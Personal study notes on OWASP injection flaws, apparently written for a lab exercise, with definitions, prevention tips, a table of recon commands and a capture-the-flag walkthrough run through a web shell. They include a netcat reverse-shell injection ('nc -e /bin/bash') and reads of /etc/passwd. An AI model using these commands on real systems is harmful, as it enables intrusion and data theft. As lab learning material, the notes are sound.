OWASP_TOP_10
############
:Author: David Boyd
:Date: 2020-10-20
:PHP: https://www.php.net/
:Reverse Shells: https://cyberwarzone.com/reverse-shell-cheat-sheet/
:PHP passthru: https://www.php.net/manual/en/function.passthru.php

#########
INJECTION
#########

active command injection
	returns the response to the user  // can *see the response*
	(made visible through several HTML elements)
	#compare(blind command injection)

blind command injection
	occurs when a command injection (system command made to the server) does
	not return the response to the use in the HTML document. // *!=seeResponse*
	#compare(active command injection)

command injection
	input is passed to system commands
	[+] Access to users' systems
		- access to data
		- carry out more attacks against infrastructure linked to the server
		  on which the command is executed.
	[+] occurs when server-side code (like PHP) in a web application makes a
		system call on the hosting machine.
	#types(active, blind)
	[+] whoami -> ;nc -e /bin/bash (reverse shells)

PHP passthru
	executes what gets entered into the input
	then passing thr output back to the browser

PHP try-catch
	[+] PHP != output of stderr, but
	[+] PHP requires a 'catch' when using a 'try' statement


SQL Injection
	controlled input is passed to SQL queries
	[+] Access, Modify, and Delete information in a database


Prevention
==========

1.	Input validation
		a.	allow list
				- input is cmp to a list of safe input/chars
		b.	stripping input
				- rm dangerous chars (any input that can change how the
									  underlying data is processed).
		[+] There are libraries that perform these actions for you.

Injection Commands
==================

+-------------------+-------------+
| Linux             | Windows     |
+===================+=============+
| whoami            | whoami      |
+-------------------+-------------+
| id                | ver         |
+-------------------+-------------+
| ifconfig /ip addr | ipconfig    |
+-------------------+-------------+
| uname -a          | tasklist    |
+-------------------+-------------+
| ps -ef            | netstat -an |
+-------------------+-------------+
| cat cat/passwd    |             |
+-------------------+-------------+

id
	displays the current user's UID, GID, and Groups

Walkthrough
===========

#1.	What strange text file is in the website root directory?

	- Actions: 10.10.109.209/evilshell.php
	- Command: ls
	- ANSWER: drpepper.txt

#2.	How many non-root/non-service/non-daemon users are there?

	- ACTIONS: https://linuxize.com/post/how-to-list-users-in-linux/
	- COMMAND: grep -E '^UID_MIN|^UID_MAX' /etc/login.defs
	- COMMAND: getent passwd {1000..60000}
	- COMMAND: cat /etc/passwd
	- ANSWER: 0

#3. What user is this app running as?

	- COMMAND: whoami
	- ANSWER: www-data

#4. What is the user's shell set as?

	- INFO: User's shell is the last ':' parameter (NOTE:$USER has 2!)
	- COMMAND: cat /etc/passwd/ | grep www
	- ANSWER: /usr/sbin/nologin

#5. What version of Ubuntu is running?

	- INFO: LSB (Linux Standard Base) holds info about your *specific* distro
	- COMMAND: lsb_release - a
	- ANSWER: 18.04.4

#6. Print out the MOTD.  What favorite beverage is shown?

	- MOTD: The */etc/motd/* is a file that contains a "message of the day"
	- MOTD: Used to send a common message to all users efficiently > email
	- COMMAND: cat /etc/motd	**DOES NOT WORK!**
	- RESOLUTION: deduction of Q#1 && num of char placeholders in answer
	- ANSWER: Dr Pepper

